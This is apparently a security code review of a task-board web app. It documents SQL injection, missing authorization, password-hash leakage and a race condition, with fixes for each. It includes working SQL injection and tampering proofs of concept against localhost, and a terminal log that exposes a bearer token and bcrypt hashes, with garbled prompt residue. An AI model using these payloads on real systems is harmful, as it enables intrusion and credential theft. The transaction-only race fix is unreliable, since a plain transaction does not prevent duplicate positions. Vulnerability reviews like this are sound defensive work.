# Code Review — TaskBoard

Top 4 issues prioritized by business impact.

---

## Issue 1 — SQL Injection in Task Search

**File:** `src/app/api/projects/[id]/tasks/route.ts`, lines 26–34  
**Category:** Security  
**Severity:** Critical

The `?q=` search parameter is interpolated directly into a raw SQL string and executed via `$queryRawUnsafe`. An authenticated project member can inject arbitrary SQL, including reading data from other tables (e.g. `users.password_hash`), modifying records, or dropping tables entirely. The membership guard on line 20 only controls project access — it does not limit what SQL the attacker can run once they are inside.

**Vulnerable code:**

```ts
const sql = `
  SELECT ...
  FROM tasks
  WHERE project_id = '${projectId}'
    AND (title ILIKE '%${q}%' OR description ILIKE '%${q}%')
  ORDER BY position ASC
`;
const tasks = await prisma.$queryRawUnsafe(sql);
```

**Proof of concept** — exfiltrate all user emails and password hashes via a UNION injection:

```bash
# 1. Log in and capture the token
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"meera@taskboard.dev","password":"password123"}' \
  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

# 2. Inject a UNION SELECT that reads the users table
# The injected payload closes the ILIKE clause and appends a UNION
curl -g -s \
  "http://localhost:3000/api/projects/<PROJECT_ID>/tasks?q=x%27)%20UNION%20SELECT%20id%2C%20project_id%2C%20email%2C%20password_hash%2C%20status%2C%20assignee_id%2C%20created_by_id%2C%200%2C%20created_at%2C%20updated_at%20FROM%20users%20WHERE%20(%271%27%3D%271" \
  -H "Authorization: Bearer $TOKEN"
```

**Expected response shape** (truncated for brevity):

```json
{
  "tasks": [
    {
      "id": "clxabc123",
      "project_id": null,
      "title": "meera@taskboard.dev",
      "description": "$2b$10$hashedpassword...",
      "status": null,
      ...
    }
  ]
}
```

User emails and bcrypt hashes from the `users` table appear in the `title` and `description` fields of the fabricated task rows.

**Recommended fix:** Replace `$queryRawUnsafe` with Prisma's parameterized `$queryRaw` using tagged template literals, or — even simpler — just use the ORM's `findMany` with a `contains` filter, which handles escaping automatically:

```ts
// Safe — no raw SQL needed at all
const tasks = await prisma.task.findMany({
  where: {
    projectId,
    OR: [
      { title: { contains: q, mode: "insensitive" } },
      { description: { contains: q, mode: "insensitive" } },
    ],
  },
  include: { assignee: { select: { id: true, name: true, email: true } } },
  orderBy: { position: "asc" },
});
```

=========================================================

 `curl` command showing the bug before

LTLDELQXM4Q1N:ajackus d111789$ curl -s -G "http://localhost:3000/api/projects/cmqxaa3nc000jpajx6rv6kk4l/tasks" \
>   --data-urlencode "q=x') UNION SELECT id, project_id, email, password_hash, status, assignee_id, created_by_id, 0, created_at, updated_at FROM users WHERE ('1'='1" \
>   -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJjbXF4YWEzbjIwMDAwcGFqeHB2MmdveGd2IiwiZW1haWwiOiJtZWVyYUB0YXNrYm9hcmQuZGV2IiwiaWF0IjoxNzgyNjIxMjIzLCJleHAiOjE3ODUyMTMyMjN9.uy_p_YLPuzR3EVbkyXhN-fimcWePcNOb-eE0foEELmw"
LTLDELQXM4Q1N:ajackus d111789$ curl -s -G "http://localhost:3000/api/projects/cmqxaa3nc000jpajx6rv6kk4l/tasks" \
>   --data-urlencode "q=x') UNION SELECT id, NULL, email, password_hash, 'todo', NULL, id, 0, created_at, updated_at FROM users--" \
>   -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJjbXF4YWEzbjIwMDAwcGFqeHB2MmdveGd2IiwiZW1haWwiOiJtZWVyYUB0YXNrYm9hcmQuZGV2IiwiaWF0IjoxNzgyNjIxMjIzLCJleHAiOjE3ODUyMTMyMjN9.uy_p_YLPuzR3EVbkyXhN-fimcWePcNOb-eE0foEELmw"
{"tasks":[{"id":"cmqxaa3n70003pajxwsxbxjp0","project_id":null,"title":"dev@example.com","description":"$2a$10$U2gHLe1CRMHQGQf72d/4veY1hcXxyWRhvW/KPuU3qe0EX/JoJR15y","status":"todo","assignee_id":null,"created_by_id":"cmqxaa3n70003pajxwsxbxjp0","position":0,"created_at":"2026-06-28T04:23:22.099Z","updated_at":"2026-06-28T04:23:22.099Z"},{"id":"cmqxaa3n20000pajxpv2goxgv","project_id":null,"title":"meera@taskboard.dev","description":"$2a$10$U2gHLe1CRMHQGQf72d/4veY1hcXxyWRhvW/KPuU3qe0EX/JoJR15y","status":"todo","assignee_id":null,"created_by_id":"cmqxaa3n20000pajxpv2goxgv","position":0,"created_at":"2026-06-28T04:23:22.094Z","updated_at":"2026-06-28T04:23:22.094Z"},{"id":"cmqxaa3n40001pajxls7bvdlh","project_id":null,"title":"arjun@taskboard.dev","description":"$2a$10$U2gHLe1CRMHQGQf72d/4veY1hcXxyWRhvW/KPuU3qe0EX/JoJR15y","status":"todo","assignee_id":null,"created_by_id":"cmqxaa3n40001pajxls7bvdlh","position":0,"created_at":"2026-06-28T04:23:22.097Z","updated_at":"2026-06-28T04:23:22.097Z"},{"id":"cmqxaa3n70004pajxrpiiqw8m","project_id":null,"title":"lina@example.com","description":"$2a$10$U2gHLe1CRMHQGQf72d/4veY1hcXxyWRhvW/KPuU3qe0EX/JoJR15y","status":"todo","assignee_id":null,"created_by_id":"cmqxaa3n70004pajxrpiiqw8m","position":0,"created_at":"2026-06-28T04:23:22.100Z","updated_at":"2026-06-28T04:23:22.100Z"},{"id":"cmqxaa3n60002pajxnnkqgl45","project_id":null,"title":"kavya@example.com","description":"$2a$10$U2gHLe1CRMHQGQf72d/4veY1hcXxyWRhvW/KPuU3qe0EX/JoJR15y","status":"todo","assignee_id":null,"created_by_id":"cmqxaa3n60002pajxnnkqgl45","position":0,"created_at":"2026-LTLDELQXM4Q1NLTLDELQXM4Q1NLTLDELQXM4Q1N:ajackus d111LTLDELQXM4Q1NLTLDELQXM4Q1NLTLDELQXM4Q1NLTLDELQXM4Q1NLTLDELQXM4Q1NLTLDELQXM4Q1NLTLDELQXM4Q1NLTLDELQXM4Q1NLTLDELQXM4Q1NLTLDELQXM4Q1NLTLDELQXM4Q1NLTLDELQXM4Q1NLTLDELQXM4Q1N:ajackus d111789$
-----------------------------------------------------
`curl` showing the fix:
LTLDELQXM4Q1N:ajackus d111789$ curl -s -G "http://localhost:3000/api/projects/cmqxaa3nc000jpajx6rv6kk4l/tasks" \
>   --data-urlencode "q=x') UNION SELECT id, NULL, email, password_hash, 'todo', NULL, id, 0, created_at, updated_at FROM users--" \
>   -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJjbXF4YWEzbjIwMDAwcGFqeHB2MmdveGd2IiwiZW1haWwiOiJtZWVyYUB0YXNrYm9hcmQuZGV2IiwiaWF0IjoxNzgyNjIxMjIzLCJleHAiOjE3ODUyMTMyMjN9.uy_p_YLPuzR3EVbkyXhN-fimcWePcNOb-eE0foEELmw"
{"tasks":[]}LTLDELQXM4Q1N:ajackus d111789$ 
=======================================================

## Issue 2 — Missing Authorization on `PATCH /api/tasks/:id`

**File:** `src/app/api/tasks/[id]/route.ts`, lines 17–37  
**Category:** Security / Data Integrity  
**Severity:** High

The `PATCH` handler verifies that the caller holds a valid JWT but never checks whether they are a member of the task's project, or whether their role permits editing. By contrast, the `DELETE` handler on the same file (lines 39–55) correctly performs both checks. Any authenticated user who can guess or enumerate a task ID — a trivial CUID — can overwrite its title, description, status, assignee, and position. A `viewer` or a member of a completely different project can silently corrupt another project's board.

**Proof of concept:**

```bash
# Log in as dev@example.com (viewer on Q3 Launch — cannot edit tasks by role)
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"dev@example.com","password":"password123"}' \
  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

# PATCH a task that the viewer should have no write access to
curl -s -X PATCH http://localhost:3000/api/tasks/<TASK_ID> \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"title":"Tampered by viewer","status":"done"}'
```

**Expected (broken) response:**

```json
{
  "task": {
    "id": "<TASK_ID>",
    "title": "Tampered by viewer",
    "status": "done",
    ...
  }
}
```

**Recommended fix:** Mirror the authorization logic from `DELETE` in the `PATCH` handler:

```ts
export async function PATCH(req: NextRequest, { params }: Params) {
  const user = await getCurrentUser(req);
  if (!user) return unauthorized();

  const { id } = await params;
  const existing = await prisma.task.findUnique({ where: { id } });
  if (!existing) return notFound("task not found");

  // Add these two lines — same pattern as DELETE
  const membership = await getProjectMembership(user.id, existing.projectId);
  if (!membership) return forbidden("you are not a member of this project");
  if (!canEditTasks(membership.role)) return forbidden("viewers cannot edit tasks");

  // ... rest of handler
}
```

---

## Issue 3 — `passwordHash` Leaked in Project API Response

**File:** `src/app/api/projects/[id]/route.ts`, lines 26–40  
**Category:** Security  
**Severity:** High

The `GET /api/projects/:id` handler uses `include: { owner: true }` and `include: { user: true }` on memberships without a `select` clause, which means Prisma returns every column from the `users` table — including `password_hash`. The bcrypt hash is then serialized into the JSON response and sent to every project member. While bcrypt hashes cannot be reversed instantly, leaking them enables offline dictionary and rainbow table attacks, and violates the principle of least privilege. The TypeScript types in `src/types/index.ts` even acknowledge this leak with an optional `passwordHash?` field.

**Proof of concept:**

```bash
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"meera@taskboard.dev","password":"password123"}' \
  | grep -o '"token":"[^"]*"' | cut -d'"' -f4)

curl -s http://localhost:3000/api/projects/<PROJECT_ID> \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -m json.tool | grep -A2 "passwordHash"
```

**Expected (broken) response excerpt:**

```json
"owner": {
  "id": "clx...",
  "email": "meera@taskboard.dev",
  "name": "Meera",
  "passwordHash": "$2b$10$...",
  "createdAt": "...",
  "updatedAt": "..."
},
"memberships": [
  {
    "user": {
      "passwordHash": "$2b$10$...",
      ...
    }
  }
]
```

**Recommended fix:** Add explicit `select` clauses to every nested user include:

```ts
const project = await prisma.project.findUnique({
  where: { id },
  include: {
    owner: { select: { id: true, name: true, email: true } },
    memberships: {
      include: {
        user: { select: { id: true, name: true, email: true } },
      },
    },
    tasks: {
      include: {
        assignee: { select: { id: true, name: true, email: true } },
        createdBy: { select: { id: true, name: true, email: true } },
      },
      orderBy: [{ status: "asc" }, { position: "asc" }],
    },
  },
});
```

Also remove the `passwordHash?` fields from the types in `src/types/index.ts` — they should never appear in the API contract.

---

## Issue 4 — Task Position Race Condition (Non-Atomic Sequencing)

**File:** `src/app/api/projects/[id]/tasks/route.ts`, lines 64–74  
**Category:** Data Integrity  
**Severity:** Medium

New tasks are positioned by first reading the current maximum position in the target column and then inserting at `max + 1`. These are two separate database round-trips with no transaction or locking, making the operation non-atomic. Under concurrent requests — two team members creating tasks in the same column at the same time — both reads may return the same `max`, both writes will use the same position value, and two tasks end up with identical positions. Duplicate positions break any deterministic sort order, causing tasks to flicker or render inconsistently on the Kanban board.

**Recommended fix:** Use a single atomic `INSERT` that computes the position inline, eliminating the read-then-write window. In Prisma this can be done with a transaction and a raw position subquery, or by using `prisma.$transaction` to lock the rows:

```ts
// Option A — single transaction (simplest)
const task = await prisma.$transaction(async (tx) => {
  const last = await tx.task.findFirst({
    where: { projectId, status },
    orderBy: { position: "desc" },
    select: { position: true },
  });
  return tx.task.create({
    data: {
      projectId,
      title: parsed.data.title,
      description: parsed.data.description,
      status,
      assigneeId: parsed.data.assigneeId ?? null,
      createdById: user.id,
      position: (last?.position ?? -1) + 1,
    },
    include: { assignee: { select: { id: true, name: true, email: true } } },
  });
});
```

A more robust long-term fix is to move away from integer positions entirely and use a fractional indexing scheme (e.g. LexoRank / base-36 midpoint strings), which allows arbitrary reordering without renumbering all sibling rows.
